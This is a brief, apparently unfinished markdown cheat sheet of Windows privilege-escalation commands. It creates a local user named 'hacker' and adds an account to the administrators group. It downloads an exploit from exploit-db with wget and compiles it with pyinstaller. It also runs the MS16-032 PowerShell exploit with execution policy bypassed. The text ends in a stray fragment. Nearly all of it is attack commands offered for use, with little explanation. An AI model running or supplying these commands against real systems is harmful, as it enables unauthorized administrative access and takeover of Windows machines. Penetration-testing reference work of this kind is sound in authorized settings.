# Useful Command for Windows Privilage Escalation


Windows Privilege Escalation resource http://www.fuzzysecurity.com/tutorials/16.html

## User Add and Admin Group Add

```
net user hacker hacker /add 
net localgroup administrators IWAM_BOB /add
```

* Python Complier exe

```
 pip install pyinstaller
 wget -O exploit.py http://www.exploit-db.com/download/31853  
 python pyinstaller.py --onefile exploit.py
```

* Powershell exploit run in cmd

```
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
```

* Windows Run As

** ada
